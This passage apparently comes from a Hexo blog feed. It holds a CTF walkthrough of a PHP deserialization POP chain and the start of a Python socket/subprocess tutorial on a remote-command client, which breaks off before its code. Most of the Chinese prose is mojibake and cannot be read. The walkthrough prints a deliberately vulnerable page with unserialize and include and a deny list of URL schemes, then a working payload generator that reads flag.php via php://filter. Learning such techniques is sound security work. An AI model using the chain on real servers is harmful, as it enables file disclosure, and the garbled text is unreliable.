    <content type="html"><![CDATA[<p><strong>å…³äºPHPååºåˆ—åŒ–çš„åŸºç¡€ï¼Œå¤§å®¶å¯ä»¥è‡ªè¡Œå­¦ä¹ ã€‚æœ¬æ¬¡ç»ƒä¹ çš„é¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯åˆ©ç”¨ç®€å•é¢˜ç›®è®²è§£æˆ‘è‡ªå·±å¯¹â€œå¦‚ä½•å¯»æ‰¾popé“¾â€çš„ç†è§£ã€‚</strong></p><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="åºŸè¯å°‘è¯´ï¼Œç›´æ¥çœ‹ä»£ç ï¼š"><a href="#åºŸè¯å°‘è¯´ï¼Œç›´æ¥çœ‹ä»£ç ï¼š" class="headerlink" title="åºŸè¯å°‘è¯´ï¼Œç›´æ¥çœ‹ä»£ç ï¼š"></a>åºŸè¯å°‘è¯´ï¼Œç›´æ¥çœ‹ä»£ç ï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>     <br>     <span class="hljs-comment">//flag is in flag.php</span><br>     <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;  <br>     <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span>; <br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;  <br>         <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>); <br>     &#125;  <br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);  <br>     &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);&#125; <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å…¶å®æˆ‘åœ¨åšåºåˆ—åŒ–é¢˜çš„æ—¶å€™ï¼Œä¹ æƒ¯æ€§çš„ä¼šå…ˆæ‰¾ä¸¤ä¸ªç‚¹ï¼š</strong></p><p><strong>1.å…¥å£ç‚¹</strong></p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬å‚æ•°çš„æ¥æ”¶ç‚¹ï¼Œä»¥ä¸Šé¢˜ä¸ºä¾‹å°±æ˜¯ï¼š<code>@unserialize($_GET[&#39;pop&#39;]);</code></p><p><strong>2.åˆ©ç”¨ç‚¹</strong></p><p>è¿™ä¸ªé¡¾åæ€ä¹‰ä¹Ÿå°±æ˜¯æˆ‘ä»¬èƒ½å¤Ÿè¿›è¡Œåˆ©ç”¨çš„åº—ï¼Œä»¥ä¸Šé¢˜ä¸ºä¾‹å°±æ˜¯ï¼š<code>include($value);</code></p><p>é‡ç‚¹æ”¾åœ¨åˆ©ç”¨ç‚¹ä¸Šï¼Œæˆ‘ä¸€èˆ¬æ¯”è¾ƒå–œæ¬¢ä»åˆ©ç”¨ç‚¹è¿›è¡Œåæ¨ã€‚</p><p><strong>ä»¥ä¸Šé¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥æœ‰å¦‚ä¸‹æ€è·¯ï¼š</strong></p><p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“åˆ©ç”¨ç‚¹åœ¨<code>appendï¼ˆï¼‰</code>æ–¹æ³•çš„ä¼ å‚ç‚¹ã€‚é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆæ‰¾èƒ½å¤Ÿè¿›è¡Œè°ƒç”¨<code>appendï¼ˆï¼‰</code>æ–¹æ³•çš„ç‚¹ã€‚äºæ˜¯æˆ‘ä»¬å°±é”å®šäº†<code>Modifierï¼ˆï¼‰</code>ç±»ä¸­çš„<code>__invokeï¼ˆï¼‰</code>é­”æœ¯æ–¹æ³•ã€‚</p><p><strong>__invoke()     &#x2F;&#x2F;è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</strong></p><p><strong>__getï¼ˆï¼‰  &#x2F;&#x2F;ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</strong></p><p>é‚£è°èƒ½è°ƒç”¨è¿™ä¸ª<code>Modifierï¼ˆï¼‰</code>ç±»ä¸­çš„<code>__invokeï¼ˆï¼‰</code>é­”æœ¯æ–¹æ³•å‘¢ï¼Ÿ </p><p>ç­”æ¡ˆæ˜¯<code>Testï¼ˆï¼‰</code>ç±»ä¸­çš„<code>__getï¼ˆï¼‰</code>æ–¹æ³•ä¸­æ‰€å…·æœ‰çš„return</p><p>é‚£è°åˆèƒ½è°ƒç”¨<code>Testï¼ˆï¼‰</code>ç±»ä¸­çš„<code>__getï¼ˆï¼‰</code>æ–¹æ³•å‘¢ï¼Ÿ</p><p>å°±æ˜¯<code>Showï¼ˆï¼‰</code>ç±»ä¸­çš„<code>__tostringï¼ˆï¼‰</code></p><p>é‚£è¿™ä¸ª<code>tostringï¼ˆï¼‰</code>åˆè¯¥æ€ä¹ˆè°ƒç”¨å‘¢ï¼Ÿ</p><p>ç»™ä»–ä¼ ä¸€ä¸ªå¯¹è±¡<code>Showï¼ˆï¼‰</code>ï¼Œç„¶åé‡å†™è¿™ä¸ªå¯¹è±¡çš„<code>$source</code>å˜é‡</p><p>å°±è¿™æ ·æˆ‘ä»¬ç®€å•çš„æ¨è§£å‡ºäº†æ•´æ¡popé“¾ï¼š</p><p><strong>Modifier(__invoke)â€”-&gt;Test(__get)â€”&gt;Show(__tostring)â€”&gt;Show(__constructï¼‰</strong></p><p>è¿™ä¸ªé“¾æ¡æ˜¯æŒ‰å€’å™æ¥è¿›è¡Œæ¨ç†çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨åˆ©ç”¨çš„æ—¶å€™è¦åè¿‡æ¥æ­£å‘åˆ©ç”¨ã€‚</p><p><strong>ç¼–å†™ä»£ç å¦‚ä¸‹ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><span class="hljs-variable">$a</span>-&gt;source = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;str = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$d</span>;<br><br><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));<br></code></pre></td></tr></table></figure><p>å…¶å®æœ€ç»ˆåˆ©ç”¨ä»£ç æ€ä¹ˆå†™å®Œå…¨å–å†³äºä¸ªäººä¹ æƒ¯ï¼Œä¸»è¦çš„è¿˜æ˜¯å¦‚ä½•å¯»æ‰¾åˆ©ç”¨é“¾çš„æ€è·¯ã€‚</p><p>å¸Œæœ›è¿™ç§åæ¨çš„æ€è·¯èƒ½å¤Ÿå¸®åŠ©å¤§å®¶ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>åŸºç¡€æ¼æ´</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pythonç®€å•è¿œè”</title>
    <link href="/2023/07/21/Python%E7%AE%80%E5%8D%95%E8%BF%9C%E8%81%94/"/>
    <url>/2023/07/21/Python%E7%AE%80%E5%8D%95%E8%BF%9C%E8%81%94/</url>
    
    <content type="html"><![CDATA[<p><strong>Python æä¾›äº†ä¸¤ä¸ªçº§åˆ«è®¿é—®çš„ç½‘ç»œæœåŠ¡ï¼š</strong></p><ul><li>ä½çº§åˆ«çš„ç½‘ç»œæœåŠ¡æ”¯æŒåŸºæœ¬çš„ Socketï¼Œå®ƒæä¾›äº†æ ‡å‡†çš„ BSD Sockets APIï¼Œå¯ä»¥è®¿é—®åº•å±‚æ“ä½œç³»ç»ŸSocketæ¥å£çš„å…¨éƒ¨æ–¹æ³•ã€‚</li><li>é«˜çº§åˆ«çš„ç½‘ç»œæœåŠ¡æ¨¡å— SocketServerï¼Œ å®ƒæä¾›äº†æœåŠ¡å™¨ä¸­å¿ƒç±»ï¼Œå¯ä»¥ç®€åŒ–ç½‘ç»œæœåŠ¡å™¨çš„å¼€å‘ã€‚</li></ul><h2 id="ä»€ä¹ˆæ˜¯-Socket"><a href="#ä»€ä¹ˆæ˜¯-Socket" class="headerlink" title="ä»€ä¹ˆæ˜¯ Socket?"></a>ä»€ä¹ˆæ˜¯ Socket?</h2><p>Socketåˆç§°â€å¥—æ¥å­—â€ï¼Œåº”ç”¨ç¨‹åºé€šå¸¸é€šè¿‡â€å¥—æ¥å­—â€å‘ç½‘ç»œå‘å‡ºè¯·æ±‚æˆ–è€…åº”ç­”ç½‘ç»œè¯·æ±‚ï¼Œä½¿ä¸»æœºé—´æˆ–è€…ä¸€å°è®¡ç®—æœºä¸Šçš„è¿›ç¨‹é—´å¯ä»¥é€šè®¯ã€‚</p><h2 id="socket-å‡½æ•°"><a href="#socket-å‡½æ•°" class="headerlink" title="socket()å‡½æ•°"></a>socket()å‡½æ•°</h2><p>Python ä¸­ï¼Œæˆ‘ä»¬ç”¨ socket() å‡½æ•°æ¥åˆ›å»ºå¥—æ¥å­—ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">socket</span>.socket([<span class="hljs-keyword">family</span>[, <span class="hljs-class"><span class="hljs-keyword">type</span>[, proto]]])</span><br></code></pre></td></tr></table></figure><h3 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h3><ul><li>family: å¥—æ¥å­—å®¶æ—å¯ä»¥æ˜¯ AF_UNIX æˆ–è€… AF_INET</li><li>type: å¥—æ¥å­—ç±»å‹å¯ä»¥æ ¹æ®æ˜¯é¢å‘è¿æ¥çš„è¿˜æ˜¯éè¿æ¥åˆ†ä¸º<code>SOCK_STREAM</code>æˆ–<code>SOCK_DGRAM</code></li><li>proto: ä¸€èˆ¬ä¸å¡«é»˜è®¤ä¸º0.</li></ul><p><strong>Socket å¯¹è±¡(å†…ç½®)æ–¹æ³•</strong></p><table><thead><tr><th><strong>æœåŠ¡å™¨ç«¯å¥—æ¥å­—</strong></th><th></th></tr></thead><tbody><tr><td>s.bind()</td><td>ç»‘å®šåœ°å€ï¼ˆhost,portï¼‰åˆ°å¥—æ¥å­—ï¼Œ åœ¨AF_INETä¸‹,ä»¥å…ƒç»„ï¼ˆhost,portï¼‰çš„å½¢å¼è¡¨ç¤ºåœ°å€ã€‚</td></tr><tr><td>s.listen()</td><td>å¼€å§‹TCPç›‘å¬ã€‚backlogæŒ‡å®šåœ¨æ‹’ç»è¿æ¥ä¹‹å‰ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥æŒ‚èµ·çš„æœ€å¤§è¿æ¥æ•°é‡ã€‚è¯¥å€¼è‡³å°‘ä¸º1ï¼Œå¤§éƒ¨åˆ†åº”ç”¨ç¨‹åºè®¾ä¸º5å°±å¯ä»¥äº†ã€‚</td></tr><tr><td>s.accept()</td><td>è¢«åŠ¨æ¥å—TCPå®¢æˆ·ç«¯è¿æ¥,(é˜»å¡å¼)ç­‰å¾…è¿æ¥çš„åˆ°æ¥</td></tr></tbody></table><table><thead><tr><th><strong>å®¢æˆ·ç«¯å¥—æ¥å­—</strong></th><th></th></tr></thead><tbody><tr><td>s.connect()</td><td>ä¸»åŠ¨åˆå§‹åŒ–TCPæœåŠ¡å™¨è¿æ¥ï¼Œã€‚ä¸€èˆ¬addressçš„æ ¼å¼ä¸ºå…ƒç»„ï¼ˆhostname,portï¼‰ï¼Œå¦‚æœè¿æ¥å‡ºé”™ï¼Œè¿”å›socket.erroré”™è¯¯ã€‚</td></tr><tr><td>s.connect_ex()</td><td>connect()å‡½æ•°çš„æ‰©å±•ç‰ˆæœ¬,å‡ºé”™æ—¶è¿”å›å‡ºé”™ç ,è€Œä¸æ˜¯æŠ›å‡ºå¼‚å¸¸</td></tr></tbody></table><table><thead><tr><th><strong>å…¬å…±ç”¨é€”çš„å¥—æ¥å­—å‡½æ•°</strong></th><th></th></tr></thead><tbody><tr><td><strong>s.recv()</strong></td><td>æ¥æ”¶TCPæ•°æ®ï¼Œæ•°æ®ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›ï¼ŒbufsizeæŒ‡å®šè¦æ¥æ”¶çš„æœ€å¤§æ•°æ®é‡ã€‚flagæä¾›æœ‰å…³æ¶ˆæ¯çš„å…¶ä»–ä¿¡æ¯ï¼Œé€šå¸¸å¯ä»¥å¿½ç•¥ã€‚</td></tr><tr><td><strong>s.send()</strong></td><td>å‘é€TCPæ•°æ®ï¼Œå°†stringä¸­çš„æ•°æ®å‘é€åˆ°è¿æ¥çš„å¥—æ¥å­—ã€‚è¿”å›å€¼æ˜¯è¦å‘é€çš„å­—èŠ‚æ•°é‡ï¼Œè¯¥æ•°é‡å¯èƒ½å°äºstringçš„å­—èŠ‚å¤§å°ã€‚</td></tr><tr><td>s.sendall()</td><td>å®Œæ•´å‘é€TCPæ•°æ®ã€‚å°†stringä¸­çš„æ•°æ®å‘é€åˆ°è¿æ¥çš„å¥—æ¥å­—ï¼Œä½†åœ¨è¿”å›ä¹‹å‰ä¼šå°è¯•å‘é€æ‰€æœ‰æ•°æ®ã€‚æˆåŠŸè¿”å›Noneï¼Œå¤±è´¥åˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</td></tr><tr><td>s.recvfrom()</td><td>æ¥æ”¶UDPæ•°æ®ï¼Œä¸recv()ç±»ä¼¼ï¼Œä½†è¿”å›å€¼æ˜¯ï¼ˆdata,addressï¼‰ã€‚å…¶ä¸­dataæ˜¯åŒ…å«æ¥æ”¶æ•°æ®çš„å­—ç¬¦ä¸²ï¼Œaddressæ˜¯å‘é€æ•°æ®çš„å¥—æ¥å­—åœ°å€ã€‚</td></tr><tr><td>s.sendto()</td><td>å‘é€UDPæ•°æ®ï¼Œå°†æ•°æ®å‘é€åˆ°å¥—æ¥å­—ï¼Œaddressæ˜¯å½¢å¼ä¸ºï¼ˆipaddrï¼Œportï¼‰çš„å…ƒç»„ï¼ŒæŒ‡å®šè¿œç¨‹åœ°å€ã€‚è¿”å›å€¼æ˜¯å‘é€çš„å­—èŠ‚æ•°ã€‚</td></tr><tr><td><strong>s.close()</strong></td><td>å…³é—­å¥—æ¥å­—</td></tr><tr><td>s.getpeername()</td><td>è¿”å›è¿æ¥å¥—æ¥å­—çš„è¿œç¨‹åœ°å€ã€‚è¿”å›å€¼é€šå¸¸æ˜¯å…ƒç»„ï¼ˆipaddr,portï¼‰ã€‚</td></tr><tr><td>s.getsockname()</td><td>è¿”å›å¥—æ¥å­—è‡ªå·±çš„åœ°å€ã€‚é€šå¸¸æ˜¯ä¸€ä¸ªå…ƒç»„(ipaddr,port)</td></tr><tr><td>s.setsockopt(level,optname,value)</td><td>è®¾ç½®ç»™å®šå¥—æ¥å­—é€‰é¡¹çš„å€¼ã€‚</td></tr><tr><td>s.getsockopt(level,optname[.buflen])</td><td>è¿”å›å¥—æ¥å­—é€‰é¡¹çš„å€¼ã€‚</td></tr><tr><td>s.settimeout(timeout)</td><td>è®¾ç½®å¥—æ¥å­—æ“ä½œçš„è¶…æ—¶æœŸï¼Œtimeoutæ˜¯ä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œå•ä½æ˜¯ç§’ã€‚å€¼ä¸ºNoneè¡¨ç¤ºæ²¡æœ‰è¶…æ—¶æœŸã€‚ä¸€èˆ¬ï¼Œè¶…æ—¶æœŸåº”è¯¥åœ¨åˆšåˆ›å»ºå¥—æ¥å­—æ—¶è®¾ç½®ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ç”¨äºè¿æ¥çš„æ“ä½œï¼ˆå¦‚connect()ï¼‰</td></tr><tr><td>s.gettimeout()</td><td>è¿”å›å½“å‰è¶…æ—¶æœŸçš„å€¼ï¼Œå•ä½æ˜¯ç§’ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®è¶…æ—¶æœŸï¼Œåˆ™è¿”å›Noneã€‚</td></tr><tr><td>s.fileno()</td><td>è¿”å›å¥—æ¥å­—çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</td></tr><tr><td>s.setblocking(flag)</td><td>å¦‚æœ flag ä¸º Falseï¼Œåˆ™å°†å¥—æ¥å­—è®¾ä¸ºéé˜»å¡æ¨¡å¼ï¼Œå¦åˆ™å°†å¥—æ¥å­—è®¾ä¸ºé˜»å¡æ¨¡å¼ï¼ˆé»˜è®¤å€¼ï¼‰ã€‚éé˜»å¡æ¨¡å¼ä¸‹ï¼Œå¦‚æœè°ƒç”¨ recv() æ²¡æœ‰å‘ç°ä»»ä½•æ•°æ®ï¼Œæˆ– send() è°ƒç”¨æ— æ³•ç«‹å³å‘é€æ•°æ®ï¼Œé‚£ä¹ˆå°†å¼•èµ· socket.error å¼‚å¸¸ã€‚</td></tr><tr><td>s.makefile()</td><td>åˆ›å»ºä¸€ä¸ªä¸è¯¥å¥—æ¥å­—ç›¸å…³è¿çš„æ–‡ä»¶</td></tr></tbody></table><p><strong>pythonä¸­subprocessæ¨¡å—</strong>ï¼š  </p><p>subprocesså¯ä»¥å¸®æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼Œè·å–æ‰§è¡Œç»“æœåŠè¿”å›å†…å®¹ã€‚</p><p>subprocessä¸­æœ‰å¦‚ä¸‹å‡ ç§æ–¹æ³•ï¼Œæˆ‘ä»¬ç”¨çš„æ˜¯å…¶ä¸­çš„runæ–¹æ³•ï¼Œè¿™é‡Œè¯¦ç»†è¯´ä¸€ä¸‹subprocess.runæ–¹æ³•</p><p>subprocess.runï¼Œsubprocess.getoutputï¼Œsubprocess.Popenã€subprocess.call</p><p><strong>subprocess.run()</strong></p><p>æ­¤æ–¹æ³•ä¸ºpython3.5ç‰ˆæœ¬åçš„æ¨èæ–¹æ³•ï¼Œå¯ä»¥è·å–æ‰§è¡Œç»“æœã€è¿”å›å†…å®¹ç­‰ä¸€äº›å¸¸ç”¨çš„ä¿¡æ¯ï¼Œ æ»¡è¶³å¤§éƒ¨åˆ†å¼€å‘éœ€è¦ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">subprocess.<span class="hljs-built_in">run</span>(args, *, <span class="hljs-attribute">stdin</span>=None, <span class="hljs-attribute">input</span>=None, <span class="hljs-attribute">stdout</span>=None,  <span class="hljs-attribute">stderr</span>=None, <span class="hljs-attribute">capture_output</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">cwd</span>=None, <span class="hljs-attribute">timeout</span>=None,  <span class="hljs-attribute">check</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">encoding</span>=None, <span class="hljs-attribute">errors</span>=None, <span class="hljs-attribute">text</span>=None, <span class="hljs-attribute">env</span>=None,  <span class="hljs-attribute">universal_newlines</span>=None)<br></code></pre></td></tr></table></figure><p><strong>args</strong>ï¼š è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ç±»å‹ä¸ºstrï¼ˆå¦‚ â€œls -lâ€ï¼‰æˆ–åŒ…å«strçš„listï¼Œtupleç­‰ï¼ˆå¦‚ [â€œlsâ€, â€œ-lâ€]ï¼‰, æ¨èä½¿ç”¨listå½¢å¼ï¼Œå¦‚æœä¼ å…¥çš„argsä¸ºsträ¸”åŒ…å«å‚æ•°ï¼Œåˆ™ å¿…é¡»shell&#x3D;Trueï¼Œé»˜è®¤ä¸ºFalseã€‚</p><p><strong>stdinã€stdoutã€stderr</strong>ï¼š  å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥ã€è¾“å‡ºã€é”™è¯¯ï¼Œå¸¸ç”¨çš„ä¸ºstdoutï¼Œæˆ‘ä»¬å¯ä»¥è·å–å‘½ä»¤æ‰§è¡Œåçš„è¾“å‡ºå†…å®¹ã€‚</p><p><strong>shellï¼š</strong>å¦‚æœè¯¥å‚æ•°ä¸º Trueï¼Œå°†é€šè¿‡æ“ä½œç³»ç»Ÿçš„ shell æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ï¼Œé»˜è®¤ä¸ºFalseã€‚</p><p><strong>timeoutï¼š</strong>è®¾ç½®å‘½ä»¤è¶…æ—¶æ—¶é—´ã€‚å¦‚æœå‘½ä»¤æ‰§è¡Œæ—¶é—´è¶…æ—¶ï¼Œå­è¿›ç¨‹å°†è¢«æ€æ­»ï¼Œå¹¶å¼¹å‡º TimeoutExpired å¼‚å¸¸ã€‚</p><p><strong>checkï¼š</strong>å¦‚æœè¯¥å‚æ•°è®¾ç½®ä¸º Trueï¼Œå¹¶ä¸”è¿›ç¨‹é€€å‡ºçŠ¶æ€ç ä¸æ˜¯ 0ï¼Œåˆ™å¼¹ å‡º CalledProcessError å¼‚å¸¸ã€‚</p><p><strong>encoding</strong>: å¦‚æœæŒ‡å®šäº†è¯¥å‚æ•°ï¼Œåˆ™ stdinã€stdout å’Œ stderr å¯ä»¥æ¥æ”¶å­—ç¬¦ä¸²æ•°æ®ï¼Œå¹¶ä»¥è¯¥ç¼–ç æ–¹å¼ç¼–ç ã€‚å¦åˆ™åªæ¥æ”¶ bytes ç±»å‹çš„æ•°æ®ã€‚</p><p><strong>capture_output</strong>ï¼š è®¾ç½®ä¸ºTrueï¼Œå°†æ•è·stdoutå’Œstderrï¼Œä»è€Œè·æ‰§è¡Œå‘½ä»¤åå–è¿”å›çš„å†…å®¹ã€‚</p><p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p><p>å¥½çš„ï¼Œäº†è§£è¿‡è¿™äº›åŸºç¡€æ–¹æ³•çš„ç”¨æ³•ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥è¯•ç€è‡ªå·±å†™ä¸€ä¸ªç®€å•çš„è¿œè”ï¼š</p><p><strong>å®¢æˆ·ç«¯ä»£ç æ€è·¯ï¼š</strong></p><p>1.æˆ‘ä»¬éœ€è¦å»è¿æ¥æœåŠ¡ç«¯å¼€å¯ç›‘å¬çš„IPå¯¹åº”çš„ç«¯å£ã€‚</p><p>2.æ¥æ”¶æœåŠ¡ç«¯ä¸‹è¾¾ç»™æˆ‘ä»¬çš„æŒ‡ä»¤</p><p>3..æˆ‘ä»¬åˆ©ç”¨subprocesså»å®šä¹‰ä¸€ä¸ªæ–¹æ³•ç”¨æ¥å°†æ‰§è¡Œå‘½ä»¤çš„ç»“æœè¿›è¡Œæ¥æ”¶å¹¶è¿”å›ç»™æœåŠ¡ç«¯</p><p>ä¸‹é¢æˆ‘ä»¬å†™<strong>å®¢æˆ·ç«¯</strong>ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs 